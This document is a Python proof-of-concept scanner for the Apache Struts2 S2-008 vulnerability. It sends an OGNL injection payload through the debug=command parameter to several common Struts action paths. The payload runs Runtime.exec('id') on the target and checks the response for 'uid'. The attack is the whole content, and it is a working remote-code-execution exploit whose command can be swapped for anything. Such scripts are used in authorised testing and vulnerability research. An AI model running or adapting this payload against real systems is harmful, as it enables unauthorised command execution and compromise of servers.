try:
    import requests,sys,os,logging,queue
except:
    os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    def __init__(self, ip,port):
        if '://' not in ip:
            self.ip = ip
            urls =  ['/Simple!addInput.action','/Simple.action','/addUser.action','/listUser.action','/helloworld.action','/S2-008/devmode.action']
            self.queues = queue.Queue(len(urls))
            for url in urls:
                
                url1 = 'http://' + ip+":"+port+url
                self.queues.put(url1)
        else:
            logging.info("[*] error input")
            os._exit(3)

    def Test(self):
        while not self.queues.empty():
                
            try:
                url = self.queues.get(False)
                req = requests.get(url + '''?debug=command&expression=(%23_memberAccess["allowStaticMethodAccess"]%3Dtrue%2C%23foo%3Dnew java.lang.Boolean("false") %2C%23context["xwork.MethodAccessor.denyMethodExecution"]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream()))''',timeout=3)
           
                if ('uid' in req.text):
                    logging.info('[+] Found S2-008 in ' + self.ip)
                    os._exit(1)
            except Exception as e:
                print(e)
                logging.info("[-] time out")
                os.exit(4)
        logging.info('[-] S2-008 Not Found in ' + self.ip)
        os._exit(2)


if __name__ == '__main__':
    ip = sys.argv[1]
    port = sys.argv[2]
    #url = '192.168.136.130'
    test = VulTest(ip,port)
    try:
        test.Test()
    except:
        os._exit(3)
    

